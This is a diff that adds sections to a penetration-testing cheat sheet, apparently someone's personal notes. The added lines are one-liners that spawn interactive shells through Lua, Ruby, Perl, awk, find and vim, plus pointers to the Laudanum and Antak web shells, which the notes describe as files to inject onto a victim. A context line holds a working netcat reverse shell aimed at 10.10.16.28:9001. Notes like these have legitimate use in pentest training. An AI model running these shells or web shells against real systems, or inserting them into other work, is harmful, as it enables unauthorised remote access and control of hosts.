@@ -29,4 +29,110 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.28 9001  | tee 
 
 ```
 
+## OS Shells
+#Helpful 
+#### Lua To Shell
+
+Spawning Interactive Shells
+
+```shell
+lua: os.execute('/bin/sh')
+```
+
+
+#### Ruby To Shell
+
+Spawning Interactive Shells
+
+```shell
+ruby: exec "/bin/sh"
+```
+
+#### Perl To Shell
+
+Spawning Interactive Shells
+
+```shell
+perl —e 'exec "/bin/sh";'
+```
+
+Spawning Interactive Shells
+
+```shell
+perl: exec "/bin/sh";
+```
+
+## /bin/sh -i
+
+This command will execute the shell interpreter specified in the path in interactive mode (`-i`).
+
+#### Interactive
+
+Spawning Interactive Shells
+
+```shell
+/bin/sh -i
+sh: no job control in this shell
+sh-4.2$
+```
+
+#### AWK To Shell
+
+Spawning Interactive Shells
+
+```shell
+awk 'BEGIN {system("/bin/sh")}'
+```
+
+#### Using Find For A Shell
+
+Spawning Interactive Shells
+
+```shell
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+```
+```shell
+find . -exec /bin/sh \; -quit
+```
+
+## VIM
+
+Yes, we can set the shell interpreter language from within the popular command-line-based text-editor `VIM`. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.
+
+#### Vim To Shell
+
+Spawning Interactive Shells
+
+```shell
+vim -c ':!/bin/sh'
+```
+
+#### Vim Escape
+
+Spawning Interactive Shells
+
+```shell
+vim
+:set shell=/bin/sh
+:shell
+```
+
+---
+## Web Shells
+
+---
+#### Laudanum
+Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more.
+#Helpful [[Web Basics]] [[File_Transfering]]
+```shell
+$ ls /usr/share/laudanum           
+asp  aspx  cfm  helpers  jsp  php  wordpress
+```
+
+## Antak Webshell
+
+Antak is a web shell built in ASP.Net included within the [Nishang project](https://github.com/samratashok/nishang). Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest.
+```bash
+$ ls /usr/share/nishang 
+```
 
